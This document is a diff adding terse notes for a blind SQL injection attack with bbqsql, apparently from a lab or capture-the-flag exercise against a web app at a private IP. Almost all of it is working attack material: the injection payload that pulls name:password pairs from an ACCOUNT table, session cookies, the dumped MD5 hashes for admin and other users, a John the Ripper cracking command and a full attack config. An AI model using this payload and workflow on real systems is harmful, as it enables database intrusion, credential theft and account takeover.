@@ -1,0 +1,36 @@
+- downgrade pip:
+    * pip install --upgrade bbqsql
+    * pip install -U gevent==1.1
+- bbqsql
+    * setup HTTP parameters
+        - url: http://192.168.0.185:8080/attendees
+        - cookies: JSESSIONID=88107F45A116AE60A30141A799B5FF68
+        - data: searchString==${query}
+        - method: post
+        - header: Content-Type: application/x-www-form-urlencoded
+    * setup BBQSQL options
+        - query: 1' OR (ASCII(SUBSTRING(SELECT CONCAT(NAME,':',PASSWORD) FROM ACCOUNT LIMIT 1 OFFSET ${row_index:1}, ${char_index:1}, 1)) ${comparator:>} ${char_val:0}) --
+        - comparison_attr: size
+    * export config
+    * run exploit
+- Output:
+    admin:e3274be5c857fb42ab72d786e281b4b8
+    user:d440aed189a13ff970dac7e7e8f987b2
+    John Smith:482c811da5d5b4bc6d497ffa98491e38
+- http://md5.gromweb.com/
+- John the ripper:
+    * john -format=raw-MD5 bbqsql_output.csv
+- bbqsql config file:
+[Request Config]
+url = http://192.168.0.185:8080/attendees
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+cookies = {'JSESSIONID': '19EE58D182C7FE01DC0312AD14172858'}
+data = searchString=${query}
+method = post
+
+[HTTP Config]
+query = 1' OR (ASCII(SUBSTRING(SELECT CONCAT(NAME,':',PASSWORD) FROM ACCOUNT LIMIT 1 OFFSET ${row_index:1}, ${char_index:1}, 1)) ${comparator:>} ${char_val:0}) --
+csv_output_file = bbqsql_output.csv
+technique = binary_search
+comparison_attr = size
+concurrency = 30
